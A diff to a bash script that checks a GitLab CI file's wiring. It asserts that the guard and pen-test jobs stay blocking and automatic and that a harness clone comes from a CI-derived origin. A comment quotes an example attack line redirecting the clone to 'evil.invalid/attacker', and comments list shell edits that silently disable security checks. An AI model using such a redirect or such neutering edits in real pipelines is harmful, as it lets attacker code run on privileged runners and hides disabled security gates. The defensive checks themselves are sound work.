@@ -21,6 +21,17 @@
 # (`extends:` REPLACES arrays), and that no job in this file is gated behind an
 # earlier stage implicitly.
 #
+# It then asserts the same thing about ITSELF (checks 9-11), because everything
+# above is only worth the paper it is printed on if something still RUNS it and
+# the scans it guards still RUN unattended. Five edits that touch no pen-test job
+# at all — allow_failure or `when: manual` on the job that runs this battery,
+# pointing that job at the guard instead of the battery, deleting the job, naming
+# a battery that is not in the repo — each retired the whole apparatus while every
+# check above kept printing "ok". So did `when: manual` on a pen-test job itself
+# (allow_failure makes a FINDING non-blocking; `when: manual` makes the SCAN
+# optional and still shows the job), and so did swapping the harness fetch's
+# CI-derived origin for a literal host.
+#
 # Pure bash + grep/sed: no YAML library, no network, no Docker — it must be
 # runnable on the plain shell runner and in a pre-commit hook.
 #
@@ -72,6 +83,89 @@ block_of() {
 # Whole file with comments stripped, for the structural greps.
 code_only() {
   sed -e 's/[[:space:]]*#.*$//' "$CI_FILE"
+}
+
+# `when: manual`, `when: "manual"` and `when: 'manual'` are the SAME YAML. The
+# first form of checks 9 and 10 grepped for the bare word, so QUOTING it — one
+# keystroke, nothing a reviewer would stop on — retired the guard job and either
+# pen-test job while every check kept printing "ok". Same class as the mutations
+# those checks were written to catch, one spelling away.
+has_gated_when() {
+  printf '%s\n' "$1" |
+    grep -E "^[[:space:]]+when:[[:space:]]*['\"]?(manual|never|delayed)['\"]?[[:space:]]*\$" >/dev/null
+}
+
+# `allow_failure: true` is one spelling of "this job cannot red the pipeline".
+# GitLab documents another — `allow_failure:` with an `exit_codes:` map — and the
+# battery exits 1, which is exactly the status that form would excuse. Checks 3/4
+# assert the PRESENCE of the policy `true` on the pen-test jobs, so they stay
+# strict; check 9 asserts its ABSENCE on the guard job, so it has to reject every
+# spelling but an explicit `false`.
+has_allow_failure_true() {
+  printf '%s\n' "$1" | grep -E '^[[:space:]]+allow_failure:[[:space:]]*true[[:space:]]*$' >/dev/null
+}
+has_any_allow_failure() {
+  printf '%s\n' "$1" | grep -E '^[[:space:]]+allow_failure:' >/dev/null || return 1
+  if printf '%s\n' "$1" | grep -E '^[[:space:]]+allow_failure:[[:space:]]*false[[:space:]]*$' >/dev/null; then
+    return 1
+  fi
+  return 0
+}
+
+# The lines under a job's `<key>:` list, in order — every line indented deeper
+# than the key, so a rules: entry's continuation (`when:`, `changes:`) comes with
+# it. Check 9 needs `script:` in ORDER (what runs BEFORE the battery is what
+# decides whether the battery runs at all) and `rules:` as a set (what the job
+# actually runs ON).
+list_items() {
+  printf '%s\n' "$1" | awk -v k="$2" '
+    !inl && $0 ~ "^[[:space:]]+" k ":[[:space:]]*$" {
+      match($0, /^[[:space:]]*/); keyind = RLENGTH; inl = 1; next
+    }
+    inl {
+      match($0, /^[[:space:]]*/)
+      if (RLENGTH > keyind) { print; next }
+      inl = 0
+    }
+  '
+}
+
+# The POSITIONAL arguments of a `git clone` command line, one per line: quotes
+# honoured, flags and the values of value-taking flags dropped.
+#
+# Parsing them positionally rather than with a fixed-shape regex is not tidiness.
+# The earlier form anchored BOTH the source and the destination to end-of-line,
+# so appending a perfectly benign `--quiet` made this file report three FAILs —
+# "clones nothing" (check 5), "'' is not hugmesh-generator" and "could not read
+# the SOURCE url" (check 11) — all pointing review at a problem that is not
+# there. A guard whose false positives are one flag away is a guard people learn
+# to click past, which is the failure mode it exists to prevent.
+clone_args() {
+  printf '%s\n' "$1" | awk '
+    {
+      sub(/^.*git[[:space:]]+clone[[:space:]]+/, "")
+      n = 0; cur = ""; inq = 0; started = 0
+      for (i = 1; i <= length($0); i++) {
+        c = substr($0, i, 1)
+        if (c == "\"") { inq = !inq; started = 1; continue }
+        if (!inq && (c == " " || c == "\t")) {
+          if (started) { tok[++n] = cur; cur = ""; started = 0 }
+          continue
+        }
+        cur = cur c; started = 1
+      }
+      if (started) tok[++n] = cur
+      skip = 0
+      for (i = 1; i <= n; i++) {
+        if (skip) { skip = 0; continue }
+        t = tok[i]
+        if (substr(t, 1, 1) == "-") {
+          if (t ~ /^(-b|-o|-u|-c|-j|--branch|--depth|--origin|--reference|--reference-if-able|--separate-git-dir|--template|--config|--jobs|--filter|--upload-pack|--shallow-since|--shallow-exclude|--server-option)$/) skip = 1
+          continue
+        }
+        print t
+      }
+    }'
 }
 
 if [ ! -f "$CI_FILE" ]; then
@@ -133,7 +227,7 @@ check_pentest_job() {
   else
     fail "$job does not extend $shown"
   fi
-  if printf '%s\n' "$body" | grep -E '^[[:space:]]+allow_failure:[[:space:]]*true[[:space:]]*$' >/dev/null; then
+  if has_allow_failure_true "$body"; then
     ok "$job keeps allow_failure: true (deliberate policy)"
   else
     fail "$job lost allow_failure: true — pen-test findings must not red the pipeline"
@@ -170,7 +264,9 @@ HARNESS_REL="${HARNESS_DIR#\$\{CI_PROJECT_DIR\}/}"
 # destination it writes to (its last quoted argument).
 CLONE_LINE="$(printf '%s\n' "$DAST_BODY" | grep -n 'git clone' | head -1)"
 CLONE_LNO="${CLONE_LINE%%:*}"
-CLONE_DEST="$(printf '%s\n' "$CLONE_LINE" | sed -n 's/^.*git clone .*"\([^"]*\)"[[:space:]]*$/\1/p')"
+CLONE_POS="$(clone_args "$CLONE_LINE")"
+CLONE_SRC="$(printf '%s\n' "$CLONE_POS" | sed -n '1p')"
+CLONE_DEST="$(printf '%s\n' "$CLONE_POS" | sed -n '2p')"
 CLONE_REL="${CLONE_DEST#\$\{CI_PROJECT_DIR\}/}"
 CLONE_BRANCH="$(printf '%s\n' "$CLONE_LINE" |
   sed -n 's/^.*git clone .*--branch[[:space:]]\{1,\}"\{0,1\}\([^[:space:]"]*\).*/\1/p')"
@@ -327,7 +423,9 @@ while read -r job; do
   JOB_IDX="$(stage_index "$JOB_STAGE")"
   [ "$JOB_IDX" -ge 0 ] || continue                       # undeclared: check 7 owns it
   JOB_AF=0
-  if printf '%s\n' "$JOB_BODY" | grep -E '^[[:space:]]+allow_failure:[[:space:]]*true[[:space:]]*$' >/dev/null; then
+  # Strict `true` on purpose: `allow_failure: exit_codes:` still lets the job fail
+  # the stage on any other status, so it stays counted as a potential blocker.
+  if has_allow_failure_true "$JOB_BODY"; then
     JOB_AF=1                                             # cannot fail the stage
   fi
   JOB_META="${JOB_META}${JOB_IDX} ${JOB_AF} ${job}
@@ -352,6 +450,242 @@ while read -r idx af job; do
     fail "$job declares no needs:, so it runs only if${BLOCKERS} succeed — an earlier failure would silently remove it from the pipeline. State the dependency (needs: [] for none)."
   fi
 done <<< "$JOB_META"
+
+# -- 9. the wiring guard itself must be BLOCKING, AUTOMATIC, AND ACTUALLY RUN --
+# Checks 1-8 all live in a file that only matters if something RUNS it. Every one
+# of these edits retires the whole apparatus without touching a single pen-test
+# job, and each left every check above printing "ok" until the sub-check named
+# beside it was written:
+#   * `allow_failure: true` on the guard job — it goes advisory, and a red guard
+#     becomes an orange shrug in exactly the pipeline view this repo has already
+#     learned not to trust                                                  (9a)
+#   * ...or `allow_failure:` with an `exit_codes:` map, GitLab's other spelling.
+#     The battery exits 1; that form excuses exactly that status              (9a)
+#   * `when: manual` — it never runs unattended, so nothing on a merge request or
+#     the default branch is ever checked                                     (9b)
+#   * ...or `when: "manual"`. Quoting a scalar changes no YAML and defeated the
+#     bare-word grep 9b (and check 10) shipped with                          (9b)
+#   * narrowing `rules:` to a condition that never matches — no forbidden word
+#     anywhere, the job simply is never created. "Skip lint on MRs to save runner
+#     time" is a likelier real edit than `when: manual` ever was             (9c)
+#   * `|| true` on the invocation, a `true ||` in front of it, an `- exit 0` or a
+#     `set +e` above it, or piping it through `tee` (GitLab sets no pipefail).
+#     Naming a script is not running it: this is the allow_failure edit written
+#     in shell instead of YAML                                               (9d)
+#   * pointing the job at check-ci-wiring.sh instead of check-ci-wiring.test.sh —
+#     the guard still runs, but the battery that proves the guard can FAIL does
+#     not, which is the same "a check that cannot fail passes for free" hole the
+#     battery exists to close                                       (job scan)
+#   * naming a battery that is not in the repo                               (9e)
+#   * ...or replacing the battery with `exit 0` under the right name, with no CI
+#     edit at all                                                            (9e)
+#   * deleting the job outright.
+# So the guard asserts its own invocation. This is not circular: the deletion case
+# is caught wherever the guard is run OTHER than from the job it is checking —
+# locally, in review, or from `npm run check:ci-wiring` / `npm run test:ci-wiring`
+# (this repo wires no pre-commit hook today; the scripts are shaped to survive one
+# if it is ever added) — and the neutering edits are caught in CI too, because in
+# every one of them the job still runs.
+GUARD_JOB=""
+GUARD_SCRIPT=""
+while read -r job; do
+  [ -n "$job" ] || continue
+  case "$job" in
+    include|variables|default|workflow|cache|stages|before_script|after_script|image|services) continue ;;
+  esac
+  CAND="$(block_of "$job" |
+    sed -n 's/^.*[[:space:]]\([^[:space:]"]*check-ci-wiring\.test\.sh\).*$/\1/p' | head -1)"
+  if [ -n "$CAND" ]; then
+    GUARD_JOB="$job"
+    GUARD_SCRIPT="$CAND"
+    break
+  fi
+done <<< "$(job_names)"
+
+if [ -z "$GUARD_JOB" ]; then
+  fail "no job in this file runs check-ci-wiring.test.sh — every check in this guard is then unreachable from CI, and the wiring can go inert with nothing to notice. (A job that runs check-ci-wiring.sh alone is NOT enough: the battery is what proves these checks can fail.)"
+else
+  ok "$GUARD_JOB runs the mutation battery ($GUARD_SCRIPT)"
+  GUARD_BODY="$(block_of "$GUARD_JOB")"
+
+  # 9a. BLOCKING — in every spelling, not just `allow_failure: true`.
+  if has_any_allow_failure "$GUARD_BODY"; then
+    fail "$GUARD_JOB carries allow_failure in some form other than an explicit 'false' — the guard becomes advisory, so a broken wiring check reds nothing. allow_failure is deliberate policy on the PEN-TEST stage (a finding must not block); it is the opposite of policy here (a guard that cannot fail is not a guard). Note this rejects GitLab's 'allow_failure: exit_codes:' map too: the battery exits 1, which is precisely the status that form excuses."
+  else
+    ok "$GUARD_JOB is blocking (no allow_failure in any form) — a broken wiring check reds the pipeline"
+  fi
+
+  # 9b. AUTOMATIC — quoted scalars included (see has_gated_when).
+  if has_gated_when "$GUARD_BODY"; then
+    fail "$GUARD_JOB carries when: manual/never/delayed — it would not run on a merge request or the default branch, so nothing checks the wiring unless a human remembers to click it"
+  else
+    ok "$GUARD_JOB runs automatically (no when: manual/never/delayed)"
+  fi
+
+  # 9c. ...and its `rules:` must actually COVER the pipelines that matter.
+  # Asserting "no when: manual" says nothing about whether the job is ever
+  # created. Replacing the rules with a branch condition that never matches —
+  # "skip lint on MRs to save runner time" is the likelier real-world edit than
+  # `when: manual` ever was — retires the guard just as completely, and left every
+  # other check printing "ok".
+  GUARD_RULES="$(list_items "$GUARD_BODY" rules)"
+  if [ -z "$GUARD_RULES" ]; then
+    ok "$GUARD_JOB declares no rules: — it runs on every pipeline"
+  else
+    # Accept every spelling that COVERS the pipeline, not just the org's usual
+    # one — a check that reds `$CI_COMMIT_BRANCH == "main"` is a false positive of
+    # exactly the kind this commit is removing elsewhere.
+    RULES_MISS=""
+    printf '%s\n' "$GUARD_RULES" |
+      grep -E 'merge_request_event|CI_MERGE_REQUEST_(IID|ID)' >/dev/null ||
+      RULES_MISS="${RULES_MISS} merge requests,"
+    printf '%s\n' "$GUARD_RULES" |
+      grep -E "CI_DEFAULT_BRANCH|CI_COMMIT_(BRANCH|REF_NAME)[[:space:]]*==[[:space:]]*[\"']" >/dev/null ||
+      RULES_MISS="${RULES_MISS} the default branch,"
+    if [ -n "$RULES_MISS" ]; then
+      fail "$GUARD_JOB's rules: do not cover${RULES_MISS%,} — a rules: set that never matches retires this guard exactly as when: manual does, without using the word. Keep an '\$CI_PIPELINE_SOURCE == \"merge_request_event\"' rule and a '\$CI_COMMIT_BRANCH == \$CI_DEFAULT_BRANCH' rule, or drop rules: altogether."
+    else
+      ok "$GUARD_JOB's rules: cover merge requests and the default branch"
+    fi
+  fi
+
+  # 9d. the battery must be run UNCONDITIONALLY, not merely NAMED.
+  # `- bash …test.sh || true`, `- true || bash …test.sh` and an `- exit 0` item
+  # above the invocation all leave the battery mentioned in the file and dead in
+  # the pipeline — the same neutering class as allow_failure, spelled in shell
+  # instead of YAML. A pipe counts too: GitLab does not set pipefail, so
+  # `… | tee log` hands the job tee's exit status.
+  GUARD_RUN_ITEMS="$(list_items "$GUARD_BODY" script)"
+  if ! printf '%s\n' "$GUARD_RUN_ITEMS" | grep -F 'check-ci-wiring.test.sh' >/dev/null; then
+    GUARD_RUN_ITEMS="$GUARD_BODY"          # invoked from before_script/after_script
+  fi
+  INV_LNO="$(printf '%s\n' "$GUARD_RUN_ITEMS" | grep -nF 'check-ci-wiring.test.sh' | head -1)"
+  INV_LNO="${INV_LNO%%:*}"
+  INV_LINE="$(printf '%s\n' "$GUARD_RUN_ITEMS" | sed -n "${INV_LNO:-1}p")"
+  NEUTERED=""
+  case "$INV_LINE" in
+    *'||'*) NEUTERED="a || short-circuit on the invocation itself" ;;
+    *'|'*)  NEUTERED="a pipe — GitLab does not set pipefail, so the job takes the LAST command's exit status, not the battery's" ;;
+  esac
+  if [ -z "$NEUTERED" ] && [ "${INV_LNO:-1}" -gt 1 ]; then
+    PRE="$(printf '%s\n' "$GUARD_RUN_ITEMS" | sed -n "1,$((INV_LNO - 1))p")"
+    if printf '%s\n' "$PRE" | grep -E '(^|[[:space:];&|])exit([[:space:]]|$)' >/dev/null; then
+      NEUTERED="an earlier script item that exits before the battery is ever reached"
+    elif printf '%s\n' "$PRE" | grep -E 'set[[:space:]]+\+(e|o[[:space:]]+errexit)' >/dev/null; then
+      NEUTERED="an earlier 'set +e', which stops a failing battery from failing the job"
+    fi
+  fi
+  if [ -n "$NEUTERED" ]; then
+    fail "$GUARD_JOB names the battery but does not run it unconditionally: ${NEUTERED}. Naming a script is not running it; this is the allow_failure edit written in shell instead of YAML."
+  else
+    ok "$GUARD_JOB runs the battery unconditionally (no ||, no pipe, nothing exits or relaxes errexit before it)"
+  fi
+
+  # 9e. the battery must exist AND be more than a file with the right NAME.
+  # An existence test is satisfied by `#!/usr/bin/env bash` + `exit 0`, with no
+  # edit to this CI file at all. A static check on another script's body is an
+  # inherent regress — a determined rewrite always wins — but the CHEAPEST
+  # spelling of it should not.
+  if [ ! -f "${REPO_ROOT}/${GUARD_SCRIPT}" ]; then
+    fail "$GUARD_JOB runs '${GUARD_SCRIPT}', which does not exist in this repo — the job would die on a bare 'No such file'"
+  elif ! sed -e 's/[[:space:]]*#.*$//' "${REPO_ROOT}/${GUARD_SCRIPT}" |
+         grep -F 'check-ci-wiring.sh' >/dev/null; then
+    fail "the battery at ${GUARD_SCRIPT} never mentions check-ci-wiring.sh (comments stripped) — a two-line 'exit 0' file under the right NAME satisfies a mere existence test and turns this whole apparatus green for free"
+  else
+    ok "the battery exists at ${GUARD_SCRIPT} and runs this guard"
+  fi
+fi
+
+# -- 10. the pen-test jobs must run AUTOMATICALLY ------------------------------
+# `allow_failure: true` (policy, check 3/4) makes a FINDING non-blocking. It does
+# not make the scan optional. `when: manual` does — and it is the tidiest possible
+# way to stop scanning while leaving a `pentest:dast` entry in the pipeline view,
+# which is the exact shape of the org-wide inertness this file exists against.
+# `when: never` and `when: delayed` are the same edit wearing different hats.
+for pjob in pentest:sca pentest:dast; do
+  PJ_BODY="$(block_of "$pjob")"
+  [ -n "$PJ_BODY" ] || continue
+  if has_gated_when "$PJ_BODY"; then
+    fail "$pjob carries when: manual/never/delayed — a scan that runs only when somebody clicks is not a scan on a merge request or the default branch, and the pipeline still shows the job"
+  else
+    ok "$pjob runs automatically (no when: manual/never/delayed)"
+  fi
+done
+
+# -- 11. the harness is fetched from THIS pipeline's own org, not a literal host -
+# Check 5 proves the harness lands where the job looks; it does not ask where the
+# harness came FROM. The fetch is the one place this pipeline pulls executable
+# code from off-repo and runs it on a privileged runner, so the source has to be
+# derived from the pipeline's own CI_ variables (CI_REPOSITORY_URL here, the
+# CI_SERVER_* triple in the org's other fetch-shaped repo) rather than written out
+# as a literal host that review has to eyeball. A hardcoded scheme://host in this
+# line passes every other check in this file.
+if [ -n "$CLONE_LINE" ]; then
+  CLONE_VAR="$(printf '%s\n' "$CLONE_SRC" | sed -n 's/^\${\([A-Za-z_][A-Za-z0-9_]*\)}.*/\1/p')"
+  if [ -z "$CLONE_SRC" ]; then
+    # FIRST, not last: an earlier ordering ran the name test on the empty string
+    # and led with "the harness clone source '' is not hugmesh-generator[.git] —
+    # a neighbouring name…", sending review after a supply-chain problem that did
+    # not exist when the real fault was a line this file could not parse.
+    fail "could not read the harness clone's SOURCE url from: ${CLONE_LINE#*:}"
+  else
+    # It must name the generator itself, not a neighbour of it. Check 5's
+    # `hugmesh-generator` grep is a substring test, so `hugmesh-generator-fork.git`
+    # satisfies it while the privileged runner executes somebody else's harness.
+    case "$CLONE_SRC" in
+      */hugmesh-generator.git|*/hugmesh-generator)
+        ok "the harness clone names hugmesh-generator exactly" ;;
+      *)
+        fail "the harness clone source '${CLONE_SRC}' is not hugmesh-generator[.git] — a neighbouring name (hugmesh-generator-fork.git) satisfies the substring test in check 5 while the privileged runner executes a different repo's harness" ;;
+    esac
+    if [ -z "$CLONE_VAR" ]; then
+      fail "the harness clone source '${CLONE_SRC}' does not start with a CI-derived variable. This job clones code and runs it on the privileged runner; the source must come from the pipeline's own CI_ variables (e.g. \${ORG_BASE} derived from CI_REPOSITORY_URL, or \${CI_SERVER_PROTOCOL}://...\${CI_SERVER_HOST}), never a literal host."
+    else
+      case "$CLONE_VAR" in
+        CI_*)
+          ok "the harness clone source is built from ${CLONE_VAR} (a CI-provided variable)" ;;
+        *)
+          # SHELL IS LAST-ASSIGNMENT-WINS, and the first form of this check asked
+          # only whether SOME assignment of the origin derived from a CI_
+          # variable. Appending one line after the honest derivation —
+          #     - ORG_BASE="https://evil.invalid/attacker"
+          # — left this check printing "ok  : …itself derived from a CI_ variable
+          # in this job" while the privileged runner cloned and executed an
+          # attacker's tree. That is the exact invariant this check advertises, so
+          # EVERY assignment has to hold: each must begin with an expansion (a
+          # literal scheme://host as the value's first component is the thing being
+          # excluded) and each must mention a CI_ variable.
+          ASSIGN_LINES="$(printf '%s\n' "$DAST_BODY" | grep -E "(^|[^A-Za-z0-9_])${CLONE_VAR}=")"
+          ASSIGN_N=0
+          ASSIGN_BAD=0
+          while IFS= read -r aline; do
+            [ -n "$aline" ] || continue
+            ASSIGN_N=$((ASSIGN_N + 1))
+            ASHOWN="$(printf '%s' "$aline" | sed 's/^[[:space:]]*-[[:space:]]*//')"
+            ARHS="${aline#*${CLONE_VAR}=}"
+            ARHS="${ARHS#\"}"
+            ARHS="${ARHS#\'}"
+            case "$ARHS" in
+              '$'*) ;;
+              *)
+                ASSIGN_BAD=$((ASSIGN_BAD + 1))
+                fail "the harness clone origin \${${CLONE_VAR}} is assigned from something that is not an expansion: '${ASHOWN}'. Shell is last-assignment-wins, so one extra line after the honest derivation silently redirects the fetch whose contents this job then RUNS on a privileged runner."
+                continue ;;
+            esac
+            if ! printf '%s\n' "$aline" | grep -E 'CI_[A-Z_]+' >/dev/null; then
+              ASSIGN_BAD=$((ASSIGN_BAD + 1))
+              fail "the harness clone origin \${${CLONE_VAR}} is assigned from '${ASHOWN}', which names no CI_ variable — the fetched code's origin is not pinned to this pipeline's own server"
+            fi
+          done <<< "$ASSIGN_LINES"
+          if [ "$ASSIGN_N" -eq 0 ]; then
+            fail "the harness clone source starts with \${${CLONE_VAR}}, which this job never assigns — the fetched code's origin is not pinned to this pipeline's own server"
+          elif [ "$ASSIGN_BAD" -eq 0 ]; then
+            ok "the harness clone source is built from ${CLONE_VAR}, and ALL ${ASSIGN_N} assignment(s) of it in this job derive from a CI_ variable (shell is last-assignment-wins)"
+          fi ;;
+      esac
+    fi
+  fi
+fi
 
 # -----------------------------------------------------------------------------
 if [ "$FAILURES" -ne 0 ]; then
